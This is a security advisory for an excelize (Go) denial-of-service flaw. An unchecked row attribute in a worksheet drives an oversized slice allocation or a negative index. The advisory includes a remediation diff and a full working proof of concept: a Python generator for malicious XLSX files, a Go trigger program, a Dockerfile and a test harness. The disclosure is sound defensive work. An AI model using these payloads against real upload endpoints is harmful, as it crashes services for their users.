# [H] Excelize: Unbounded Row Index Allocation in Worksheet Parser (checkSheet OOM/Panic DoS)

## Summary
Severity: High
Advisory: GHSA-h69g-9hx6-f3v4
CVE: CVE-2026-54063
CWE: CWE-770
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-07-10
Source: https://github.com/advisories/GHSA-h69g-9hx6-f3v4
Type: github-advisory

## Affected
- Go: `github.com/xuri/excelize/v2` — affected >=0 <2.11.0

## Details
## Unbounded Row Index Allocation in Worksheet Parser (checkSheet OOM/Panic DoS)

### Summary
The `checkSheet()` function in `github.com/xuri/excelize/v2` uses an attacker-controlled `<row r="N">` XML attribute value directly as the length argument to `make([]xlsxRow, row)` without validating it against the Excel row limit (`TotalRows = 1,048,576`). A specially crafted XLSX file can trigger two denial-of-service variants: (A) an out-of-memory process kill when `r=2147483647` forces a ~16 GB allocation attempt, and (B) a runtime panic via out-of-bounds slice indexing when `r=-1`. Any service that opens attacker-supplied XLSX files and calls `GetCellValue` is affected. No authentication is required.

### Details
The vulnerable code path is triggered by calling `GetCellValue` (or any API that internally invokes `workSheetReader`) on an XLSX file containing a crafted worksheet row element.

**Data flow (source → sink):**

1. `excelize.go:186-193` — `OpenReader` reads attacker-controlled spreadsheet bytes.
2. `excelize.go:216-223` — ZIP reader is created and passed to `ReadZipReader`.
3. `lib.go:43-77` — ZIP entries are read into `fileList`; worksheet XML is stored by part name.
4. `excelize.go:228-229` — XML bytes are stored in `f.Pkg`.
5. `cell.go:71-79` — Public `GetCellValue` enters the worksheet value-read path.
6. `cell.go:1492-1494` — `getCellStringFunc` calls `workSheetReader`.
7. `excelize.go:313-324` — Worksheet XML is decoded into `xlsxWorksheet`.
8. `xmlWorksheet.go:302-312` — `<row r="...">` is deserialized into `xlsxRow.R int` with no validation (source).
9. `excelize.go:357-377` — `checkSheet()` accumulates the maximum `r` value; **sink**: `make([]xlsxRow, row)` allocates a slice of that size before any bounds check.

**Vulnerable code (`excelize.go:373-377`):**
```go
if r.R != 0 && r.R > row {
    row = r.R
}
sheetData := xlsxSheetData{Row: make([]xlsxRow, row)}  // unbounded allocation
```

The constant `TotalRows = 1048576` is defined in `templates.go:190` but is never applied before the `make()` call in `checkSheet()`, leaving the allocation fully attacker-controlled.

**Variant A (`r = 2147483647`):** `make([]xlsxRow, 2147483647)` attempts to allocate approximately 16 GB of memory. The Go runtime terminates the process with `fatal error: runtime: out of memory`.

**Variant B (`r = -1`):** The first loop in `checkSheet()` leaves `row = 0` because the condition `r.R != 0` is false for `r.R = -1`. The second loop then executes `sheetData.Row[r.R-1]`, which evaluates to `sheetData.Row[-2]`, triggering `runtime error: index out of range [-2]` at `excelize.go:381`.

Dynamic reproduction confirmed both variants inside a memory-limited Docker container (256 MB). The full panic stack trace for Variant B is:
```
panic: runtime error: index out of range [-2]

goroutine 1 [running]:
github.com/xuri/excelize/v2.(*xlsxWorksheet).checkSheet(...)
        /excelize/excelize.go:381
github.com/xuri/excelize/v2.(*File).workSheetReader(...)
        /excelize/excelize.go:329
github.com/xuri/excelize/v2.(*File).getCellStringFunc(...)
        /excelize/cell.go:1494
github.com/xuri/excelize/v2.(*File).GetCellValue(...)
        /excelize/cell.go:72
main.main.func1(...)
        /excelize/cmd/poc/main.go:44
main.main()
        /excelize/cmd/poc/main.go:52
```

**Recommended remediation (`excelize.go`):**
```diff
-func (ws *xlsxWorksheet) checkSheet() {
+func (ws *xlsxWorksheet) checkSheet() error {
     ...
         for i := 0; i < len(ws.SheetData.Row); i++ {
             r := ws.SheetData.Row[i]
+            if r.R < 0 {
+                return newInvalidRowNumberError(r.R)
+            }
+            if r.R > TotalRows {
+                return ErrMaxRows
+            }
     ...
     ws.SheetData = *sheetData
+    return nil
 }
```

### PoC

**Step 1: Generate the malicious XLSX**

```python
import zipfile

# Variant A: OOM   → row = "2147483647"
# Variant B: Panic → row = "-1"
row = "-1"

with zipfile.ZipFile("malicious.xlsx", "w", zipfile.ZIP_DEFLATED) as z:
    z.writestr("[Content_Types].xml", '''<?xml version="1.0" encoding="UTF-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
<Default Extension="xml" ContentType="application/xml"/>
<Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>
<Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
</Types>''')
    z.writestr("_rels/.rels", '''<?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>
</Relationships>''')
    z.writestr("xl/workbook.xml", '''<?xml version="1.0" encoding="UTF-8"?>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"
          xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
<sheets><sheet name="Sheet1" sheetId="1" r:id="rId1"/></sheets>
</workbook>''')
    z.writestr("xl/_rels/workbook.xml.rels", '''<?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>
</Relationships>''')
    z.writestr("xl/worksheets/sheet1.xml", f'''<?xml version="1.0" encoding="UTF-8"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
<sheetData><row r="{row}"><c r="A1"><v>1</v></c></row></sheetData>
</worksheet>''')
```

**Step 2: Trigger the vulnerability**

```go
package main

import "github.com/xuri/excelize/v2"

func main() {
    f, err := excelize.OpenFile("malicious.xlsx")
    if err != nil { panic(err) }
    defer f.Close()
    _, err = f.GetCellValue("Sheet1", "A1")  // triggers checkSheet() → unbounded make()
    if err != nil { panic(err) }
}
```

**Expected results:**
- Variant A (`r="2147483647"`): process is killed by the OOM killer (`fatal error: runtime: out of memory` or exit code 137).
- Variant B (`r="-1"`): process panics with `runtime error: index out of range [-2]` at `excelize.go:381` (exit code 2).

Both variants were confirmed in a Docker container with `--memory 256m --memory-swap 256m`. The malicious XLSX payload is a few hundred bytes.

### Impact

This is a **Denial-of-Service** vulnerability. An unauthenticated remote attacker can crash or memory-exhaust any Go application that uses `github.com/xuri/excelize/v2` to open attacker-supplied XLSX files and subsequently calls any cell-reading API (`GetCellValue`, `GetRows`, `GetCols`, or any function that internally triggers `workSheetReader`).

**Who is impacted:**
- Web services with XLSX upload or import endpoints (document processors, data pipelines, BI tools).
- CLI tools or batch jobs that parse user-supplied spreadsheet files.
- Any application using the library to handle untrusted XLSX documents.

The attack requires no authentication and no user interaction beyond uploading a malicious file. The payload is a minimal well-formed ZIP of a few hundred bytes, making it trivial to construct and deliver. Repeated or concurrent exploitation can permanently deny service to all users of the affected application.

### Reproduction artifacts

#### `Dockerfile`

```dockerfile
# Dockerfile for VULN-001: Unbounded Row Index Allocation in excelize checkSheet()
# CWE-770 — Allocation of Resources Without Limits or Throttling
# Target: github.com/xuri/excelize/v2 @ commit f4a068b
#
# Exploit path:
#   GetCellValue -> getCellStringFunc -> workSheetReader -> checkSheet()
#   In checkSheet() (excelize.go:341-393), the attacker-controlled <row r="N">
#   attribute is used directly as make([]xlsxRow, row) size with no bounds check.
#
# Variant A (r=2147483647): OOM — make([]xlsxRow, 2147483647) exhausts memory
# Variant B (r=-1):         Panic — second loop does sheetData.Row[-2] (index OOB)

FROM golang:latest AS builder

# Copy the vulnerable excelize library source (serves as the Go module)
COPY repo/ /excelize/

# Copy the exploit main package written by poc.py
COPY vuln-001/exploit_main.go /excelize/cmd/poc/main.go

WORKDIR /excelize

# Build the exploit binary.
# -mod=mod: allow Go to update go.sum for any transitive deps.
# CGO_ENABLED=0: produce a statically-linked binary for the runtime stage.
RUN CGO_ENABLED=0 GOFLAGS="-mod=mod" go build -o /poc ./cmd/poc/

# Minimal runtime stage (golang image provides a libc for cgo-free binary too)
FROM golang:latest
COPY --from=builder /poc /poc
ENTRYPOINT ["/poc"]
```

#### `poc.py`

```python
#!/usr/bin/env python3
"""
PoC for VULN-001: Unbounded Row Index Allocation in excelize checkSheet()
CWE-770 — Allocation of Resources Without Limits or Throttling
Repository: qax-os/excelize  Commit: f4a068b

Exploit mechanism:
  xlsxWorksheet.checkSheet() (excelize.go:341-393) iterates worksheet rows and
  uses the attacker-controlled <row r="N"> attribute directly as the length
  argument to make([]xlsxRow, row) without any bounds validation against
  TotalRows (1,048,576).

  Variant A (r=2147483647): make([]xlsxRow, 2^31-1) → OOM / fatal error
  Variant B (r=-1):         first loop leaves row=0; second loop executes
                            sheetData.Row[-1-1] → runtime panic: index out of range

This script:
  1. Writes exploit_main.go (the Go PoC binary source).
  2. Creates two malicious XLSX files (one per variant).
  3. Builds the Docker image.
  4. Runs each variant and captures evidence.
  5. Writes phase2_result.json with verdict.
"""

import json
import os
import subprocess
import sys
import textwrap
import zipfile

# ---------------------------------------------------------------------------
# Paths
# ---------------------------------------------------------------------------
BASE_DIR     = os.path.dirname(os.path.abspath(__file__))
PARENT_DIR   = os.path.dirname(BASE_DIR)          # Docker build context
RESULT_FILE  = os.path.join(BASE_DIR, "phase2_result.json")
DOCKERFILE   = os.path.join(BASE_DIR, "Dockerfile")
IMAGE_NAME   = "excelize-poc-vuln001"

EXPLOIT_SRC  = os.path.join(BASE_DIR, "exploit_main.go")
PANIC_XLSX   = os.path.join(BASE_DIR, "row_negative.xlsx")
OOM_XLSX     = os.path.join(BASE_DIR, "row_maxint.xlsx")


# ---------------------------------------------------------------------------
# Step 1 — Write the Go exploit source
# ---------------------------------------------------------------------------
EXPLOIT_GO = textwrap.dedent("""\
    // exploit_main.go — PoC for VULN-001
    // Triggers excelize checkSheet() unbounded allocation via malicious XLSX.
    package main

    import (
    \t"fmt"
    \t"os"
    \t"runtime/debug"

    \texcelize "github.com/xuri/excelize/v2"
    )

    func main() {
    \tif len(os.Args) < 2 {
    \t\tfmt.Fprintln(os.Stderr, "Usage: poc <xlsx_file>")
    \t\tos.Exit(1)
    \t}
    \tpath := os.Args[1]
    \tfmt.Printf("[*] Opening: %s\\n", path)

    \t// Wrap the call so we can print a structured panic message before exiting.
    \t// The panic itself is the evidence of exploitability.
    \tfunc() {
    \t\tdefer func() {
    \t\t\tif r := recover(); r != nil {
    \t\t\t\tfmt.Println("[VULN] PANIC CAUGHT — vulnerability confirmed")
    \t\t\t\tfmt.Printf("[VULN] panic value: %v\\n", r)
    \t\t\t\tfmt.Println("[VULN] Stack trace:")
    \t\t\t\tdebug.PrintStack()
    \t\t\t\tos.Exit(2) // exit 2 = exploitable crash (panic)
    \t\t\t}
    \t\t}()

    \t\tf, err := excelize.OpenFile(path)
    \t\tif err != nil {
    \t\t\tfmt.Printf("[!] OpenFile error: %v\\n", err)
    \t\t\tos.Exit(1)
    \t\t}
    \t\tdefer f.Close()

    \t\t// GetCellValue → getCellStringFunc → workSheetReader → checkSheet()
    \t\t// checkSheet() is the sink: make([]xlsxRow, row) where row is attacker-controlled.
    \t\tfmt.Println("[*] Calling GetCellValue — entering checkSheet() sink")
    \t\tval, err := f.GetCellValue("Sheet1", "A1")
    \t\tif err != nil {
    \t\t\t// Some errors surface instead of panicking (e.g. allocation failures
    \t\t\t// that Go converts to errors in some configurations).
    \t\t\tfmt.Printf("[!] GetCellValue error: %v\\n", err)
    \t\t\tos.Exit(3) // exit 3 = error path (still abnormal)
    \t\t}
    \t\tfmt.Printf("[*] GetCellValue returned normally, value=%q (no crash)\\n", val)
    \t}()
    }
""")


def write_exploit_source() -> None:
    with open(EXPLOIT_SRC, "w") as fh:
        fh.write(EXPLOIT_GO)
    print(f"[+] Wrote exploit source: {EXPLOIT_SRC}")


# ---------------------------------------------------------------------------
# Step 2 — Build malicious XLSX files
# ---------------------------------------------------------------------------
CONTENT_TYPES = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
    '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
    '<Default Extension="xml"  ContentType="application/xml"/>'
    '<Override PartName="/xl/workbook.xml"'
    ' ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>'
    '<Override PartName="/xl/worksheets/sheet1.xml"'
    ' ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>'
    '</Types>'
)

RELS = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
    '<Relationship Id="rId1"'
    ' Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument"'
    ' Target="xl/workbook.xml"/>'
    '</Relationships>'
)

WORKBOOK = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"'
    ' xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">'
    '<sheets><sheet name="Sheet1" sheetId="1" r:id="rId1"/></sheets>'
    '</workbook>'
)

WORKBOOK_RELS = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
    '<Relationship Id="rId1"'
    ' Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet"'
    ' Target="worksheets/sheet1.xml"/>'
    '</Relationships>'
)


def sheet_xml(row_r: str) -> str:
    return (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
        f'<sheetData><row r="{row_r}"><c r="A1"><v>1</v></c></row></sheetData>'
        '</worksheet>'
    )


def build_xlsx(path: str, row_r: str) -> None:
    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("[Content_Types].xml",        CONTENT_TYPES)
        z.writestr("_rels/.rels",               RELS)
        z.writestr("xl/workbook.xml",           WORKBOOK)
        z.writestr("xl/_rels/workbook.xml.rels", WORKBOOK_RELS)
        z.writestr("xl/worksheets/sheet1.xml",  sheet_xml(row_r))
    print(f"[+] Created {os.path.basename(path)}  (row r={row_r!r})")


# ---------------------------------------------------------------------------
# Step 3 — Docker helpers
# ---------------------------------------------------------------------------
def run_cmd(cmd: list, timeout: int = 600) -> subprocess.CompletedProcess:
    print(f"[>] {' '.join(str(x) for x in cmd)}")
    return subprocess.run(
        cmd,
        capture_output=True,
        text=True,
        timeout=timeout,
    )


def docker_build() -> tuple[bool, str]:
    result = run_cmd(
        [
            "docker", "build",
            "--no-cache",
            "-f", DOCKERFILE,
            "-t", IMAGE_NAME,
            PARENT_DIR,
        ],
        timeout=600,
    )
    combined = result.stdout + result.stderr
    if result.returncode != 0:
        print(f"[-] docker build FAILED (rc={result.returncode})")
        print(combined[-4000:])
        return False, combined
    print("[+] Docker image built successfully")
    return True, combined


def docker_run_variant(label: str, xlsx_path: str, mem: str = "256m", timeout: int = 90) -> dict:
    """Run the exploit container against one XLSX file and return analysis dict."""
    cmd = [
        "docker", "run", "--rm",
        "--memory", mem,
        "--memory-swap", mem,
        "-v", f"{xlsx_path}:/input.xlsx:ro",
        IMAGE_NAME,
        "/input.xlsx",
    ]
    run_cmd_str = " ".join(cmd)
    try:
        result = run_cmd(cmd, timeout=timeout)
        rc = result.returncode
        stdout = result.stdout or ""
        stderr = result.stderr or ""
    except subprocess.TimeoutExpired:
        rc = -99
        stdout = ""
        stderr = f"TIMEOUT after {timeout}s"

    combined = stdout + stderr
    print(f"\n--- {label} ---")
    print(f"  exit code : {rc}")
    print(f"  stdout    : {stdout[:1200]}")
    print(f"  stderr    : {stderr[:1200]}")

    is_panic = any(kw in combined for kw in (
        "index out of range",
        "PANIC CAUGHT",
        "runtime error",
        "goroutine ",
        "panic:",
    ))
    is_oom = any(kw in combined for kw in (
        "out of memory",
        "cannot allocate",
        "fatal error",
        "makeslice",
    )) or rc == 137

    # exit 2 = panic caught; exit 137 = OOM kill; exit 3 = error path
    crashed = rc != 0 and (is_panic or is_oom or rc in (2, 3, 137))

    return {
        "label":    label,
        "rc":       rc,
        "is_panic": is_panic,
        "is_oom":   is_oom,
        "crashed":  crashed,
        "run_cmd":  run_cmd_str,
        "snippet":  combined[:1500].strip(),
    }


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main() -> None:
    print("=" * 65)
    print("VULN-001 PoC — excelize checkSheet() unbounded allocation DoS")
    print("=" * 65)

    # 1. Write Go exploit source (needed before docker build)
    write_exploit_source()

    # 2. Create malicious XLSX payloads
    build_xlsx(PANIC_XLSX, "-1")          # Variant B: index OOB panic
    build_xlsx(OOM_XLSX,   "2147483647")  # Variant A: 2 GB+ make() → OOM

    # 3. Build Docker image
    build_cmd = (
        f"docker build --no-cache -f {DOCKERFILE} -t {IMAGE_NAME} {PARENT_DIR}"
    )
    build_ok, build_out = docker_build()
    if not build_ok:
        payload = {
            "passed":        False,
            "verdict":       "FAIL",
            "reason":        (
                "Docker 이미지 빌드에 실패했습니다. golang:latest 이미지가 go.mod의 "
                "'go 1.25.0' 요건을 충족하지 않을 수 있습니다. Dockerfile에서 "
                "'golang:1.25' 등 명시적 버전 태그로 교체 후 재시도 바랍니다."
            ),
            "build_command": build_cmd,
            "run_command":   "",
            "poc_command":   f"python3 {os.path.abspath(__file__)}",
            "evidence":      build_out[-2000:],
            "artifacts":     ["Dockerfile", "poc.py"],
        }
        with open(RESULT_FILE, "w") as fh:
            json.dump(payload, fh, indent=2, ensure_ascii=False)
        print(f"\n[!] FAIL result → {RESULT_FILE}")
        sys.exit(1)

    # 4. Run both variants
    ev_panic = docker_run_variant(
        "Variant B — r=-1 (index out of range panic)", PANIC_XLSX, mem="256m")
    ev_oom   = docker_run_variant(
        "Variant A — r=2147483647 (OOM)",              OOM_XLSX,   mem="256m")

    # 5. Verdict
    passed = ev_panic["crashed"] or ev_oom["crashed"]

    if ev_panic["crashed"]:
        primary, primary_ev = "B (r=-1, panic)", ev_panic
    elif ev_oom["crashed"]:
        primary, primary_ev = "A (r=2147483647, OOM)", ev_oom
    else:
        primary, primary_ev = "B (r=-1, panic)", ev_panic  # best-effort

    if passed:
        reason = (
            f"실행 결과 비정상 종료 확인됨 (주요 variant: {primary}). "
            f"Variant B(r=-1): rc={ev_panic['rc']}, panic={ev_panic['is_panic']}; "
            f"Variant A(r=2147483647): rc={ev_oom['rc']}, oom={ev_oom['is_oom']}. "
            "excelize.go:377 make([]xlsxRow, row)에 대한 bounds 검증 부재가 "
            "컨테이너 내 실제 DoS(패닉/OOM)를 유발함을 실행으로 증명."
        )
        verdict = "PASS"
    else:
        reason = (
            "컨테이너 실행이 완료되었으나 충돌(패닉/OOM) 증거가 관측되지 않음. "
            f"Variant B rc={ev_panic['rc']}, Variant A rc={ev_oom['rc']}. "
            "가능한 원인: (1) Go 런타임이 make() 실패를 panic 대신 error로 반환, "
            "(2) 메모리 한도 초과 전 OOM killer가 작동하지 않음. "
            "다음을 시도: --memory 64m으로 재실행, 또는 호스트에서 직접 Go 빌드 후 실행."
        )
        verdict = "FAIL"

    phase2 = {
        "passed":        passed,
        "verdict":       verdict,
        "reason":        reason,
        "build_command": build_cmd,
        "run_command":   primary_ev["run_cmd"],
        "poc_command":   f"python3 {os.path.abspath(__file__)}",
        "evidence":      primary_ev["snippet"],
        "artifacts":     ["Dockerfile", "poc.py"],
    }

    with open(RESULT_FILE, "w") as fh:
        json.dump(phase2, fh, indent=2, ensure_ascii=False)

    print(f"\n{'='*65}")
    print(f"Verdict : {verdict}  (passed={passed})")
    print(f"Result  → {RESULT_FILE}")
    print("=" * 65)


if __name__ == "__main__":
    main()
```

## References
- https://github.com/qax-os/excelize/security/advisories/GHSA-h69g-9hx6-f3v4
- https://nvd.nist.gov/vuln/detail/CVE-2026-54063
- https://github.com/qax-os/excelize
- https://github.com/qax-os/excelize/releases/tag/v2.11.0
